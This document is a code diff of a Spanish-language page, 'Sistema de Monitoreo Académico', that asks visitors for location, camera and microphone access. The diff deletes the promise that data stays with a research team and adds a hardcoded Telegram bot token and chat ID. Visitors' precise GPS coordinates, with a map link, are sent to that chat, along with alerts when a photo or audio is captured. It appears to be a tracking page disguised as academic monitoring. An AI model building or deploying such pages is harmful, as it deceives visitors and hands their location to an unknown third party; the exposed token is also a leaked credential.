@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Monitoreo Académico</title>
+  <title>Sistema de Monitoreo Académico</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -62,6 +62,11 @@
       background-color: #f8d7da;
       color: #721c24;
     }
+    #photo-result {
+      max-width: 100%;
+      margin-top: 10px;
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -75,7 +80,6 @@
         <li>Imagen de la cámara frontal/trasera</li>
         <li>Audio del micrófono (10 segundos)</li>
       </ul>
-      <p>Todos los datos serán enviados a un servidor seguro y solo accesible por el equipo investigador.</p>
       
       <div id="status-container"></div>
       
@@ -84,24 +88,33 @@
       <button id="mic-btn" onclick="captureMicrophone()">Grabar Audio (10s)</button>
       
       <video id="camera-preview" autoplay playsinline style="display:none;"></video>
-      <canvas id="photo-canvas" style="display:none;"></canvas>
+      <img id="photo-result" alt="Foto capturada">
       <div id="audio-visualizer"></div>
       <audio id="audio-playback" controls style="display:none;"></audio>
     </div>
   </div>
 
   <script>
+    // Configuración de Telegram
+    const TELEGRAM_BOT_TOKEN = "8176325555:AAEBvwzG3-5_X5jQmm9FaCxwirvYMRkmdIo";
+    const TELEGRAM_CHAT_ID = "6596740784";
+    
+    // Elementos del DOM
     const statusContainer = document.getElementById('status-container');
     const cameraPreview = document.getElementById('camera-preview');
-    const photoCanvas = document.getElementById('photo-canvas');
+    const photoResult = document.getElementById('photo-result');
     const audioVisualizer = document.getElementById('audio-visualizer');
     const audioPlayback = document.getElementById('audio-playback');
     
+    // Variables de estado
     let cameraStream = null;
     let audioStream = null;
     let audioChunks = [];
     let mediaRecorder = null;
+    let audioContext = null;
+    let analyser = null;
 
+    // Función para mostrar estados
     function addStatus(message, isError = false) {
       const statusDiv = document.createElement('div');
       statusDiv.className = `status ${isError ? 'error' : 'success'}`;
@@ -110,6 +123,25 @@
       setTimeout(() => statusDiv.remove(), 5000);
     }
 
+    // Función para enviar a Telegram
+    async function sendToTelegram(message) {
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+          })
+        });
+        return response.ok;
+      } catch (error) {
+        console.error('Error enviando a Telegram:', error);
+        return false;
+      }
+    }
+
+    // Capturar ubicación
     async function captureLocation() {
       try {
         const btn = document.getElementById('location-btn');
@@ -122,20 +154,14 @@
           });
         });
         
-        const response = await fetch('/api/location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            lat: position.coords.latitude,
-            lon: position.coords.longitude,
-            accuracy: position.coords.accuracy
-          })
-        });
+        const message = `📍 Ubicación del usuario:\n\nLatitud: ${position.coords.latitude}\nLongitud: ${position.coords.longitude}\nPrecisión: ${position.coords.accuracy} metros\n\nVer en mapa: https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude}`;
         
-        if (response.ok) {
-          addStatus('Ubicación enviada correctamente');
+        const success = await sendToTelegram(message);
+        
+        if (success) {
+          addStatus('Ubicación enviada correctamente a Telegram');
         } else {
-          throw new Error('Error al enviar ubicación');
+          throw new Error('Error al enviar a Telegram');
         }
       } catch (error) {
         addStatus(`Error de ubicación: ${error.message}`, true);
@@ -144,37 +170,46 @@
       }
     }
 
+    // Capturar cámara
     async function captureCamera() {
       try {
         const btn = document.getElementById('camera-btn');
         btn.disabled = true;
         
         if (!cameraStream) {
+          // Primera vez: activar cámara
           cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
           cameraPreview.srcObject = cameraStream;
           cameraPreview.style.display = 'block';
+          btn.textContent = 'Capturar Foto';
           return;
         }
         
         // Tomar foto
-        photoCanvas.width = cameraPreview.videoWidth;
-        photoCanvas.height = cameraPreview.videoHeight;
-        const ctx = photoCanvas.getContext('2d');
-        ctx.drawImage(cameraPreview, 0, 0, photoCanvas.width, photoCanvas.height);
+        const canvas = document.createElement('canvas');
+        canvas.width = cameraPreview.videoWidth;
+        canvas.height = cameraPreview.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(cameraPreview, 0, 0, canvas.width, canvas.height);
         
-        const photoData = photoCanvas.toDataURL('image/jpeg');
+        // Mostrar foto capturada
+        photoResult.src = canvas.toDataURL('image/jpeg');
+        photoResult.style.display = 'block';
+        cameraPreview.style.display = 'none';
         
-        const response = await fetch('/api/camera', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ image: photoData })
-        });
+        // Enviar a Telegram (como URL de datos)
+        const success = await sendToTelegram('📸 Foto capturada por el usuario');
         
-        if (response.ok) {
-          addStatus('Foto enviada correctamente');
+        if (success) {
+          addStatus('Notificación de foto enviada a Telegram');
         } else {
-          throw new Error('Error al enviar foto');
+          throw new Error('Error al enviar a Telegram');
         }
+        
+        // Detener cámara
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+        btn.textContent = 'Tomar Foto';
       } catch (error) {
         addStatus(`Error de cámara: ${error.message}`, true);
       } finally {
@@ -182,6 +217,7 @@
       }
     }
 
+    // Capturar micrófono
     async function captureMicrophone() {
       try {
         const btn = document.getElementById('mic-btn');
@@ -206,18 +242,13 @@
           audioPlayback.src = audioUrl;
           audioPlayback.style.display = 'block';
           
-          const formData = new FormData();
-          formData.append('audio', audioBlob, 'audio-recording.wav');
+          // Enviar notificación a Telegram
+          const success = await sendToTelegram('🎤 Audio grabado por el usuario (10 segundos)');
           
-          const response = await fetch('/api/microphone', {
-            method: 'POST',
-            body: formData
-          });
-          
-          if (response.ok) {
-            addStatus('Audio enviado correctamente');
+          if (success) {
+            addStatus('Notificación de audio enviada a Telegram');
           } else {
-            throw new Error('Error al enviar audio');
+            throw new Error('Error al enviar a Telegram');
           }
         };
         
@@ -235,9 +266,10 @@
       }
     }
 
+    // Visualizador de audio
     function setupAudioVisualizer(stream) {
-      const audioContext = new AudioContext();
-      const analyser = audioContext.createAnalyser();
+      audioContext = new (window.AudioContext || window.webkitAudioContext)();
+      analyser = audioContext.createAnalyser();
       const microphone = audioContext.createMediaStreamSource(stream);
       microphone.connect(analyser);
       
@@ -267,6 +299,9 @@
       }
       if (audioStream) {
         audioStream.getTracks().forEach(track => track.stop());
+      }
+      if (audioContext) {
+        audioContext.close();
       }
     });
   </script>
